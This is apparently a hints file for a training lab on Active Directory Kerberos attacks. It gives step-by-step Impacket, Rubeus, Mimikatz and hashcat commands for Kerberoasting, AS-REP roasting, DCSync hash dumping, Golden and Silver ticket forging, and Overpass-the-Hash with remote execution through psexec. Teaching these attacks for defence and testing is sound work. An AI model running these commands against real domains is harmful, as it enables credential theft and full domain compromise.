# Kerberos Attacks Hints

Progressive hints for each Kerberos attack task.

---

## Task 1: Kerberoasting

### Hint 1 (Light)
Any authenticated domain user can request a TGS for any service with an SPN. Look for user accounts (not computer accounts) with SPNs set.

### Hint 2 (Medium)
```bash
# Use GetUserSPNs.py from Impacket
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP
```

### Hint 3 (Heavy)
```bash
# Complete Kerberoasting workflow

# 1. Find SPNs
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10

# 2. Request tickets and save hashes
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 \
    -request -outputfile tgs_hashes.txt

# 3. Crack with hashcat
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# Windows alternative with Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

---

## Task 2: AS-REP Roasting

### Hint 1 (Light)
Accounts with "Do not require Kerberos preauthentication" enabled are vulnerable. Check userAccountControl flag 0x400000.

### Hint 2 (Medium)
```bash
# Use GetNPUsers.py from Impacket
GetNPUsers.py domain.local/user:password -dc-ip DC_IP
```

### Hint 3 (Heavy)
```bash
# Complete AS-REP Roasting workflow

# 1. Find vulnerable accounts (with credentials)
GetNPUsers.py domain.local/user:password -dc-ip 192.168.1.10

# 2. Request AS-REP hashes
GetNPUsers.py domain.local/user:password -dc-ip 192.168.1.10 \
    -format hashcat -outputfile asrep.txt

# Without credentials (need user list):
GetNPUsers.py domain.local/ -usersfile users.txt \
    -format hashcat -no-pass -dc-ip 192.168.1.10

# 3. Crack with hashcat (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Windows alternative
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

---

## Task 3: Golden Ticket

### Hint 1 (Light)
You need the krbtgt hash to forge TGTs. This requires Domain Admin access or DCSync rights.

### Hint 2 (Medium)
```bash
# Get krbtgt hash with DCSync
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt

# Get domain SID
lookupsid.py domain.local/user:password@dc01.domain.local 0
```

### Hint 3 (Heavy)
```bash
# Complete Golden Ticket attack

# 1. DCSync for krbtgt hash
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt
# Note: krbtgt:502:aad3....:NTLM_HASH_HERE

# 2. Get Domain SID
lookupsid.py domain.local/user:password@dc01.domain.local 0
# Note: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# 3. Create Golden Ticket
ticketer.py -nthash KRBTGT_NTLM_HASH \
    -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain domain.local Administrator

# 4. Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass

# Windows with Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
    /sid:S-1-5-21-XXX /krbtgt:HASH /ticket:golden.kirbi
mimikatz # kerberos::ptt golden.kirbi
```

---

## Task 4: Silver Ticket

### Hint 1 (Light)
Silver Tickets forge service tickets, not TGTs. You need the service account's hash, not krbtgt.

### Hint 2 (Medium)
```bash
# Get service account hash
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user 'TARGET$'

# Create Silver Ticket for CIFS
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-XXX \
    -domain domain.local -spn CIFS/target.domain.local Administrator
```

### Hint 3 (Heavy)
```bash
# Complete Silver Ticket attack for file share access

# 1. Get computer account hash (for CIFS)
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user 'DC01$'
# Computer accounts use $ suffix

# 2. Get Domain SID
lookupsid.py domain.local/user:password@dc01.domain.local 0

# 3. Create Silver Ticket
ticketer.py -nthash COMPUTER_NTLM_HASH \
    -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain domain.local \
    -spn CIFS/dc01.domain.local \
    Administrator

# 4. Use the ticket
export KRB5CCNAME=Administrator.ccache
smbclient //dc01.domain.local/C$ -k -no-pass

# Common SPNs:
# - CIFS/hostname (file shares)
# - HTTP/hostname (web, WinRM)
# - HOST/hostname (general)
# - LDAP/hostname (directory)
# - MSSQLSvc/hostname:1433 (SQL Server)
```

---

## Task 5: Overpass-the-Hash

### Hint 1 (Light)
Overpass-the-Hash uses an NTLM hash to request a Kerberos TGT, combining PtH with Kerberos authentication.

### Hint 2 (Medium)
```bash
# Get TGT using NTLM hash
getTGT.py domain.local/user -hashes :NTLM_HASH -dc-ip DC_IP
```

### Hint 3 (Heavy)
```bash
# Complete Overpass-the-Hash attack

# 1. Obtain NTLM hash (from previous compromise)
# Example: from secretsdump, Mimikatz, or SAM dump

# 2. Request TGT with hash
getTGT.py domain.local/Administrator -hashes :NTLM_HASH -dc-ip 192.168.1.10

# 3. Export ticket
export KRB5CCNAME=Administrator.ccache

# 4. Use with any Kerberos-capable tool
psexec.py domain.local/Administrator@target.domain.local -k -no-pass
wmiexec.py domain.local/Administrator@target.domain.local -k -no-pass
smbclient //target.domain.local/C$ -k -no-pass

# Windows with Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local \
    /ntlm:HASH /run:powershell.exe

# Windows with Rubeus
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
```

---

## Troubleshooting Hints

### Clock Skew Error
```bash
# Kerberos requires time within 5 minutes of DC
sudo ntpdate dc01.domain.local
# or
sudo timedatectl set-ntp false
sudo date -s "$(date -d 'DC_TIME' +'%Y-%m-%d %H:%M:%S')"
```

### Ticket Format Conversion
```bash
# Convert .kirbi (Windows) to .ccache (Linux)
ticketConverter.py ticket.kirbi ticket.ccache

# Then export
export KRB5CCNAME=ticket.ccache
```

### Kerberos Configuration
```bash
# Ensure /etc/krb5.conf is configured
[libdefaults]
    default_realm = DOMAIN.LOCAL

[realms]
    DOMAIN.LOCAL = {
        kdc = dc01.domain.local
        admin_server = dc01.domain.local
    }

[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL
```

### Hash Formats
```
Kerberoasting (TGS-REP):
$krb5tgs$23$*user$realm$spn*$hash...
hashcat mode: 13100

AS-REP Roasting:
$krb5asrep$23$user@realm:hash...
hashcat mode: 18200

Kerberos 5 AES256:
hashcat mode: 19700
```

---

## Common Mistakes

1. **Wrong hash format** - Ensure you're using the NTLM hash, not LM or AES
2. **Clock skew** - Sync time with the DC before Kerberos operations
3. **DNS issues** - Kerberos often requires proper hostname resolution
4. **Case sensitivity** - Realm names are typically UPPERCASE
5. **Ticket expiration** - TGTs have limited lifetime (default 10 hours)
6. **SPN format** - Use correct format: service/hostname[:port]
7. **Domain SID** - Must be complete: S-1-5-21-XXX-XXX-XXX (three parts)

---

## Quick Reference

### Impacket Tools for Kerberos
```
GetUserSPNs.py  - Kerberoasting
GetNPUsers.py   - AS-REP Roasting
getTGT.py       - Request TGT with creds/hash
ticketer.py     - Create Golden/Silver tickets
ticketConverter.py - Convert ticket formats
psexec.py -k    - PsExec with Kerberos
secretsdump.py  - DCSync for hashes
```

### Rubeus Commands
```
kerberoast      - Kerberoasting
asreproast      - AS-REP Roasting
asktgt          - Request TGT
asktgs          - Request TGS
ptt             - Pass-the-Ticket
dump            - Dump tickets
```

### Mimikatz Commands
```
kerberos::golden  - Create Golden/Silver ticket
kerberos::ptt     - Pass-the-Ticket
sekurlsa::pth     - Overpass-the-Hash
lsadump::dcsync   - DCSync
sekurlsa::tickets - Export tickets
```
